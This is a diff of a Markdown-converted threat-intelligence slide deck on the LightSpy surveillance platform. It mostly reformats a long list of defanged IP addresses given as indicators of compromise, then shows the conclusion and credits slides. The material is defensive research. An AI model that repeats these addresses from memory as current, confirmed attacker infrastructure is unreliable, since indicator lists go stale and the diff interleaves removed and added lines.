-47[.]100[.]37[.]213|103[.]43[.]19[.]227
-103[.]99[.]132[.]85|144[.]172[.]101[.]37
-144[.]172[.]114[.]63|193[.]56[.]255[.]203
-195[.]66[.]213[.]58|
-|43[.]131[.]42[.]10
-43[.]132[.]231[.]160|47[.]105[.]79[.]86
-47[.]106[.]99[.]111|103[.]122[.]164[.]127
-103[.]140[.]186[.]175|147[.]139[.]243[.]178
-149[.]104[.]18[.]80|202[.]43[.]239[.]13
-202[.]124[.]251[.]173|
-|43[.]135[.]93[.]189|47[.]108[.]137[.]200|103[.]140[.]238[.]123|149[.]104[.]18[.]251|213[.]111[.]146[.]135|
-|43[.]248[.]8[.]76|47[.]236[.]30[.]141|103[.]145[.]107[.]35|150[.]109[.]233[.]186|213[.]111[.]157[.]223|
-|43[.]248[.]8[.]108|47[.]237[.]99[.]173|103[.]145[.]107[.]208|151[.]242[.]85[.]130|213[.]250[.]132[.]188|
-|43[.]248[.]78[.]215
-|47[.]238[.]155[.]170
-|103[.]151[.]111[.]116
-|151[.]242[.]85[.]248
-|222[.]219[.]183[.]84|
-|43[.]248[.]136[.]104
+27[.]124[.]37[.]59
+27[.]124[.]37[.]64
+38[.]54[.]79[.]250
+43[.]103[.]49[.]61
+43[.]131[.]42[.]10
+43[.]132[.]231[.]160
+43[.]135[.]93[.]189
+43[.]248[.]8[.]76
+43[.]248[.]8[.]108
+43[.]248[.]78[.]215
+43[.]248[.]136[.]104
 43[.]248[.]136[.]110
-43[.]248[.]136[.]160|47[.]250[.]43[.]18
-49[.]232[.]185[.]137
-58[.]221[.]58[.]240|103[.]172[.]27[.]108
-103[.]172[.]27[.]121
-103[.]174[.]97[.]90|154[.]91[.]196[.]185
-156[.]232[.]254[.]32
-159[.]138[.]110[.]168||
-|43[.]248[.]136[.]215
-43[.]248[.]136[.]241|84[.]200[.]87[.]221
-92[.]63[.]180[.]49|103[.]214[.]22[.]204
-103[.]238[.]225[.]46|165[.]154[.]7[.]25
-166[.]108[.]197[.]183||
-|45[.]38[.]210[.]13|101[.]132[.]41[.]216|103[.]253[.]43[.]182|176[.]97[.]117[.]136||
-|45[.]83[.]237[.]13
+43[.]248[.]136[.]160
+43[.]248[.]136[.]215
+43[.]248[.]136[.]241
+45[.]38[.]210[.]13
+45[.]83[.]237[.]13
 45[.]95[.]42[.]175
 45[.]125[.]34[.]126
-|103[.]27[.]108[.]70
+45[.]134[.]174[.]250
+45[.]155[.]220[.]79
+45[.]155[.]220[.]194
+47[.]76[.]66[.]156
+
+47[.]76[.]150[.]84
+47[.]79[.]149[.]19
+47[.]92[.]141[.]231
+47[.]92[.]168[.]159
+47[.]96[.]148[.]5
+47[.]98[.]243[.]165
+47[.]100[.]37[.]213
+47[.]105[.]79[.]86
+47[.]106[.]99[.]111
+47[.]108[.]137[.]200
+47[.]236[.]30[.]141
+47[.]237[.]99[.]173
+47[.]238[.]155[.]170
+47[.]250[.]43[.]18
+49[.]232[.]185[.]137
+58[.]221[.]58[.]240
+84[.]200[.]87[.]221
+92[.]63[.]180[.]49
+101[.]132[.]41[.]216
+103[.]27[.]108[.]70
 103[.]27[.]108[.]122
 103[.]27[.]108[.]205
-|103[.]255[.]176[.]176
+103[.]27[.]108[.]207
+103[.]27[.]109[.]28
+103[.]27[.]109[.]217
+103[.]27[.]110[.]159
+
+103[.]43[.]16[.]82
+103[.]43[.]17[.]53
+103[.]43[.]17[.]99
+103[.]43[.]18[.]95
+103[.]43[.]19[.]64
+103[.]43[.]19[.]227
+103[.]99[.]132[.]85
+103[.]122[.]164[.]127
+103[.]140[.]186[.]175
+103[.]140[.]238[.]123
+103[.]145[.]107[.]35
+103[.]145[.]107[.]208
+103[.]151[.]111[.]116
+103[.]172[.]27[.]108
+103[.]172[.]27[.]121
+103[.]174[.]97[.]90
+103[.]214[.]22[.]204
+103[.]238[.]225[.]46
+103[.]253[.]43[.]182
+103[.]255[.]176[.]176
 104[.]21[.]95[.]124
 106[.]14[.]112[.]154
-|176[.]97[.]117[.]164
+107[.]149[.]184[.]175
+118[.]193[.]39[.]165
+118[.]195[.]147[.]249
+118[.]195[.]234[.]243
+
+119[.]147[.]213[.]48
+120[.]24[.]250[.]220
+120[.]55[.]51[.]191
+121[.]196[.]234[.]241
+121[.]201[.]109[.]98
+144[.]172[.]101[.]37
+144[.]172[.]114[.]63
+147[.]139[.]243[.]178
+149[.]104[.]18[.]80
+149[.]104[.]18[.]251
+150[.]109[.]233[.]186
+151[.]242[.]85[.]130
+151[.]242[.]85[.]248
+154[.]91[.]196[.]185
+156[.]232[.]254[.]32
+159[.]138[.]110[.]168
+165[.]154[.]7[.]25
+166[.]108[.]197[.]183
+176[.]97[.]117[.]136
+176[.]97[.]117[.]164
 176[.]97[.]117[.]176
 176[.]97[.]117[.]182
-||
-|45[.]134[.]174[.]250
-|103[.]27[.]108[.]207
-|107[.]149[.]184[.]175
-|176[.]97[.]117[.]183
-||
-|45[.]155[.]220[.]79|103[.]27[.]109[.]28|118[.]193[.]39[.]165|176[.]119[.]156[.]36||
-|45[.]155[.]220[.]194|103[.]27[.]109[.]217|118[.]195[.]147[.]249|183[.]56[.]160[.]240||
-|47[.]76[.]66[.]156|103[.]27[.]110[.]159|118[.]195[.]234[.]243|185[.]175[.]59[.]244||
+176[.]97[.]117[.]183
+176[.]119[.]156[.]36
+183[.]56[.]160[.]240
+185[.]175[.]59[.]244
 
-55
+185[.]195[.]66[.]75
+185[.]195[.]66[.]86
+185[.]198[.]58[.]30
+192[.]142[.]45[.]238
+193[.]56[.]255[.]191
+193[.]56[.]255[.]203
+195[.]66[.]213[.]58
+202[.]43[.]239[.]13
+202[.]124[.]251[.]173
+213[.]111[.]146[.]135
+213[.]111[.]157[.]223
+213[.]250[.]132[.]188
+222[.]219[.]183[.]84
 
 ## Slide 56
 
@@ -1267,20 +1597,31 @@ samroms[.]top samsunggadget[.]shop samsunginfotech[.]com sansx-lifeovoi[.]xyz sh
 
 **WHAT DO WE HAVE?**
 
-**LightSpy:** productized, multi-tenant surveillance-and-sabotage platform built by a small private Shenzhen software company and operated for state customer(s) under a hybrid commercial / state-patronage model. **Foundation:** The stale toolchain dates the project's foundation to 2017 - roughly two years before the first public LightSpy report (2020). **Infrastructure Expansion:** from China mainland it’s expanded servers to SG, HK, NL, PK, JP, CN, MY, DE, US, TH, ID, KR, AT, TR
+**LightSpy:** productized, multi-tenant surveillance-and-sabotage platform built by a small private Shenzhen software company and operated for state customer(s) under a hybrid commercial / state-patronage model.
+
+**Foundation:** The stale toolchain dates the project's foundation to 2017 - roughly two years before the first public LightSpy report (2020).
+
+**Infrastructure Expansion:** from China mainland it’s expanded servers to SG, HK, NL, PK, JP, CN, MY, DE, US, TH, ID, KR, AT, TR
 
 ###### **Industry Collaboration:**
 
 - Detect and Hunt (IOCs)
 
-- Defending People (General OpSec) - Full Disclosure Trusted Partners
+- Defending People (General OpSec)
+
+- Full Disclosure Trusted Partners
 
 - Invitation for Joint Follow-up Research
-
-56
 
 ## Slide 57
 
 # THANK YOU
 
-**Dmitry Bestuzhev          Dmitry Melikov X: @dimitribest                    X: @DmitriyMelikov In: Bestuzhev In: dmitry-melikov-210000142**
+**Dmitry Bestuzhev**
+X: @dimitribest
+In: Bestuzhev
+
+**Dmitry Melikov**
+X: @DmitriyMelikov
+In: dmitry-melikov-210000142
+
